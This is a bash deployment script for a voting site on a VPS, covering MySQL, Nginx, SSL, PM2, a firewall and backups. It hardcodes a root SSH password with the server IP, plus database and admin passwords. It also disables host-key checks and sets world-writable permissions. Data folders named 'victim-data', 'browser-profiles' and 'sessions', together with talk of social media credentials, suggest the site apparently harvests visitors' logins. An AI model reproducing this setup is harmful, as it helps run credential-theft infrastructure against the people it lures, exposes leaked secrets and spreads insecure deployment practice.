#!/bin/bash

# Production VPS Deployment Script
# Domain: votingonline2025.site
# Server: root@85.31.224.8

set -e

# Configuration
VPS_HOST="85.31.224.8"
VPS_USER="root"
VPS_PASSWORD="123123zz@"
DOMAIN="votingonline2025.site"
APP_DIR="/home/${DOMAIN}/public_html"
DATA_DIR="/home/${DOMAIN}/data"
LOGS_DIR="/home/${DOMAIN}/logs"
BACKUP_DIR="/home/${DOMAIN}/backups"

# Database Configuration
DB_NAME="voti_voting_secure_2025"
DB_USER="voti_voting_user"
DB_PASSWORD="123123zz@"

echo "🚀 Starting VPS Production Deployment"
echo "======================================"
echo "Domain: $DOMAIN"
echo "VPS: $VPS_HOST"
echo "App Directory: $APP_DIR"
echo ""

# Function to run command on VPS
run_on_vps() {
    sshpass -p "$VPS_PASSWORD" ssh -o StrictHostKeyChecking=no "$VPS_USER@$VPS_HOST" "$1"
}

# Function to copy files to VPS
copy_to_vps() {
    sshpass -p "$VPS_PASSWORD" scp -o StrictHostKeyChecking=no -r "$1" "$VPS_USER@$VPS_HOST:$2"
}

# Step 1: Prepare VPS Environment
echo "📋 Step 1: Preparing VPS Environment..."

run_on_vps "
    # Update system
    apt update && apt upgrade -y

    # Install required packages
    apt install -y curl wget git nginx mysql-server nodejs npm build-essential python3-pip

    # Install Node.js 18 (if not already installed)
    curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
    apt-get install -y nodejs

    # Install PM2 globally
    npm install -g pm2

    # Install additional tools
    apt install -y sshpass ufw fail2ban

    echo '✅ System packages installed'
"

# Step 2: Setup Directory Structure
echo "📁 Step 2: Setting up directory structure..."

run_on_vps "
    # Create application directories
    mkdir -p $APP_DIR
    mkdir -p $DATA_DIR/{victim-data,browser-profiles,downloads,sessions}
    mkdir -p $LOGS_DIR
    mkdir -p $BACKUP_DIR
    mkdir -p /home/${DOMAIN}/uploads

    # Set proper permissions
    chown -R www-data:www-data /home/${DOMAIN}
    chmod -R 755 /home/${DOMAIN}
    chmod -R 777 $LOGS_DIR
    chmod -R 777 $DATA_DIR

    echo '✅ Directory structure created'
"

# Step 3: Setup MySQL Database
echo "🗄️ Step 3: Setting up MySQL database..."

run_on_vps "
    # Secure MySQL installation (automated)
    mysql -e \"ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '${DB_PASSWORD}';\"
    mysql -e \"DELETE FROM mysql.user WHERE User='';\"
    mysql -e \"DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');\"
    mysql -e \"DROP DATABASE IF EXISTS test;\"
    mysql -e \"DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';\"
    mysql -e \"FLUSH PRIVILEGES;\"

    # Create application database and user
    mysql -u root -p${DB_PASSWORD} -e \"CREATE DATABASE IF NOT EXISTS ${DB_NAME} CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;\"
    mysql -u root -p${DB_PASSWORD} -e \"CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASSWORD}';\"
    mysql -u root -p${DB_PASSWORD} -e \"GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';\"
    mysql -u root -p${DB_PASSWORD} -e \"FLUSH PRIVILEGES;\"

    echo '✅ MySQL database configured'
"

# Step 4: Deploy Application Code
echo "📦 Step 4: Deploying application code..."

# Create temporary deployment package
echo "📦 Creating deployment package..."
tar --exclude='node_modules' --exclude='.git' --exclude='*.log' -czf deployment.tar.gz .

# Upload to VPS
echo "📤 Uploading to VPS..."
copy_to_vps "deployment.tar.gz" "/tmp/"

# Extract and setup on VPS
run_on_vps "
    cd $APP_DIR

    # Backup existing if exists
    if [ -d 'current' ]; then
        mv current backup_\$(date +%Y%m%d_%H%M%S) || true
    fi

    # Extract new deployment
    tar -xzf /tmp/deployment.tar.gz -C .

    # Install dependencies
    npm install --production

    # Build frontend applications
    cd admin && npm install && npm run build && cd ..
    cd user && npm install && npm run build && cd ..

    # Copy production environment file
    cp production/.env.production .env

    echo '✅ Application code deployed'
"

# Step 5: Configure Nginx
echo "🌐 Step 5: Configuring Nginx..."

copy_to_vps "production/nginx.conf" "/tmp/voting-nginx.conf"

run_on_vps "
    # Copy Nginx configuration
    cp /tmp/voting-nginx.conf /etc/nginx/sites-available/${DOMAIN}

    # Enable site
    ln -sf /etc/nginx/sites-available/${DOMAIN} /etc/nginx/sites-enabled/

    # Remove default site
    rm -f /etc/nginx/sites-enabled/default

    # Test and reload Nginx
    nginx -t && systemctl reload nginx
    systemctl enable nginx

    echo '✅ Nginx configured'
"

# Step 6: Setup SSL Certificate
echo "🔐 Step 6: Setting up SSL certificate..."

run_on_vps "
    # Install Certbot
    apt install -y certbot python3-certbot-nginx

    # Get SSL certificate for domain and subdomains
    certbot --nginx -d ${DOMAIN} -d www.${DOMAIN} -d admin.${DOMAIN} -d api.${DOMAIN} --non-interactive --agree-tos --email admin@${DOMAIN}

    # Setup auto-renewal
    (crontab -l 2>/dev/null; echo '0 12 * * * /usr/bin/certbot renew --quiet') | crontab -

    echo '✅ SSL certificate configured'
"

# Step 7: Setup PM2 Application
echo "⚙️ Step 7: Setting up PM2 application..."

copy_to_vps "production/ecosystem.config.js" "$APP_DIR/"

run_on_vps "
    cd $APP_DIR

    # Stop existing PM2 processes
    pm2 delete all || true

    # Start applications with PM2
    pm2 start ecosystem.config.js --env production

    # Save PM2 configuration and setup startup
    pm2 save
    pm2 startup

    echo '✅ PM2 applications started'
"

# Step 8: Setup Firewall
echo "🛡️ Step 8: Setting up firewall..."

run_on_vps "
    # Configure UFW firewall
    ufw --force reset
    ufw default deny incoming
    ufw default allow outgoing

    # Allow SSH (change port if needed)
    ufw allow 22/tcp

    # Allow HTTP and HTTPS
    ufw allow 80/tcp
    ufw allow 443/tcp

    # Allow MySQL (only from localhost)
    ufw allow from 127.0.0.1 to any port 3306

    # Enable firewall
    ufw --force enable

    echo '✅ Firewall configured'
"

# Step 9: Setup Monitoring and Backup
echo "📊 Step 9: Setting up monitoring and backup..."

run_on_vps "
    # Create backup script
    cat > /home/${DOMAIN}/backup.sh << 'EOF'
#!/bin/bash
BACKUP_DIR=\"$BACKUP_DIR\"
DATE=\$(date +%Y%m%d_%H%M%S)

# Database backup
mysqldump -u ${DB_USER} -p${DB_PASSWORD} ${DB_NAME} > \"\$BACKUP_DIR/db_backup_\$DATE.sql\"

# Application data backup
tar -czf \"\$BACKUP_DIR/data_backup_\$DATE.tar.gz\" -C \"$DATA_DIR\" .

# Clean old backups (keep last 7 days)
find \"\$BACKUP_DIR\" -type f -mtime +7 -delete

echo \"Backup completed: \$DATE\"
EOF

    chmod +x /home/${DOMAIN}/backup.sh

    # Setup daily backup cron
    (crontab -l 2>/dev/null; echo '0 2 * * * /home/${DOMAIN}/backup.sh') | crontab -

    # Setup log rotation
    cat > /etc/logrotate.d/${DOMAIN} << EOF
$LOGS_DIR/*.log {
    daily
    missingok
    rotate 30
    compress
    notifempty
    create 644 www-data www-data
    postrotate
        systemctl reload nginx
    endscript
}
EOF

    echo '✅ Monitoring and backup configured'
"

# Step 10: Initialize Database Schema
echo "🗄️ Step 10: Initializing database schema..."

run_on_vps "
    cd $APP_DIR

    # Run database initialization
    node -e \"
        import('./production/database-production.js').then(async (db) => {
            await db.default.initialize();
            console.log('Database schema initialized');
            process.exit(0);
        }).catch(err => {
            console.error('Database init failed:', err);
            process.exit(1);
        });
    \"

    echo '✅ Database schema initialized'
"

# Step 11: Health Check and Verification
echo "🔍 Step 11: Running health checks..."

sleep 10  # Wait for services to start

run_on_vps "
    # Check PM2 status
    echo '📊 PM2 Status:'
    pm2 status

    # Check Nginx status
    echo '🌐 Nginx Status:'
    systemctl status nginx --no-pager -l

    # Check application health
    echo '🔍 Application Health Check:'
    curl -f http://localhost:3000/health || echo 'Health check failed'
    curl -f http://localhost:3001/api/system/health || echo 'API health check failed'

    # Check database connection
    echo '🗄️ Database Connection Check:'
    mysql -u ${DB_USER} -p${DB_PASSWORD} -e 'SELECT \"Database connection successful\" as status;' ${DB_NAME}

    echo '✅ Health checks completed'
"

# Step 12: Final Setup and Instructions
echo "🎯 Step 12: Final setup..."

# Cleanup
rm -f deployment.tar.gz

echo ""
echo "🎉 DEPLOYMENT COMPLETED SUCCESSFULLY!"
echo "===================================="
echo ""
echo "🌐 Your application is now available at:"
echo "   Main Site: https://${DOMAIN}"
echo "   Admin Panel: https://admin.${DOMAIN}"
echo "   API: https://api.${DOMAIN}"
echo ""
echo "📊 Management Commands:"
echo "   PM2 Status: pm2 status"
echo "   View Logs: pm2 logs"
echo "   Restart: pm2 restart all"
echo "   Monitor: pm2 monit"
echo ""
echo "📁 Important Directories:"
echo "   Application: $APP_DIR"
echo "   Data: $DATA_DIR"
echo "   Logs: $LOGS_DIR"
echo "   Backups: $BACKUP_DIR"
echo ""
echo "🔐 Admin Credentials:"
echo "   Username: admin"
echo "   Password: AdminVoting2025@Secure!"
echo "   (Change immediately after login)"
echo ""
echo "🗄️ Database Info:"
echo "   Database: $DB_NAME"
echo "   User: $DB_USER"
echo "   Host: localhost"
echo ""
echo "🔧 Next Steps:"
echo "   1. Test all functionality"
echo "   2. Change default admin password"
echo "   3. Configure social media API credentials"
echo "   4. Setup monitoring and alerts"
echo "   5. Test backup and recovery"
echo ""
echo "✅ Production deployment ready!"
